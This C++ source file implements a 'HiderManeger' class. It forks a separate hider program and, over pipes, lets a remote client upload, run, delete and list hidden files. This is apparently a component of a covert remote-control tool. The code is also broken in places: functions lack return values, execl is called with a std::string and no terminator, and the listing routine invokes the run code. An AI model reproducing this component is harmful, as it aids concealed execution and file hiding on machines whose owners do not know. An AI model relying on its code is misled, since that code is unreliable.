#include <iostream>
#include <unistd.h>
#include <sys/wait.h>

#include "HiderManeger.h"

HiderManeger::HiderManeger()
{
    hiderPath = DEFAULT_HIDER_PATH;
    HtMredirect = false;
    MtHredirect = false;
}

Error HiderManeger::setUpHider(std::string path)
{
    hiderPath = path;
}

void HiderManeger::activateHiderChild(FunCode fncode, std::string param) {
    char numericalArg[3];
    sprintf(numericalArg, "%d", fncode);

    if (MtHredirect) {
        close(mthpipe[1]);
        dup2(mthpipe[0], STDIN_FILENO);
        close(mthpipe[0]);
    } 
    if (HtMredirect) {
        close(htmpipe[0]);
        dup2(htmpipe[1], STDOUT_FILENO);
        close(htmpipe[1]);
    }
    
    execl(hiderPath.c_str(), numericalArg, param);
}

Error HiderManeger::activateHider(FunCode fncode, std::string param)
{
    pid_t pid = fork();
    if (pid == -1) {
        return HIDER_FORK_ERROR;
    }
    if (pid == 0) { // child work
        activateHiderChild(fncode, param);
    }

    return SUCCSESS;
}

Error HiderManeger::openPipes(int p[])
{
    if (pipe(p) == -1) {
        return Error::HIDER_PIPE_ERROR;
    }
    return Error::SUCCSESS;
}

Error HiderManeger::hiddenUpload(std::string param, Client& client)
{
    openPipes(mthpipe);
    MtHredirect = true;
    activateHider(FunCode::HIDDEN_UPLOAD, param);
    close(mthpipe[0]);
    MtHredirect = false;

    // send file server -> pipe
    char buffer[BUFFER_SIZE] = {0};
    while (true)
    {
        int bytes_received = client.recvData(buffer);
        if (bytes_received <= 0)
            break;
        write(mthpipe[1], buffer, bytes_received); 
    }

    close(mthpipe[1]);
}

Error HiderManeger::hiddenDelete(std::string param)
{
    return activateHider(FUNCODES_ENUM_H::HIDDEN_DELETE, param);
}

Error HiderManeger::hiddenRun(std::string param)
{
    return activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, param);
}

Error HiderManeger::hiddenList(Client& client)
{
    openPipes(htmpipe);
    HtMredirect = true;
    Error er = activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, "");
    close(htmpipe[1]);
    if (er) {
        return er;
    }
    HtMredirect = false;
    
    // loop for receiving file pipe -> server
    bool cont = true;
    char buffer[BUFFER_SIZE] = {0};
    while (cont)
    {
        if (read(htmpipe[0], buffer, BUFFER_SIZE) != BUFFER_SIZE)
            cont = false;
        client.sendData(buffer);
    }
    
    close(htmpipe[0]);
}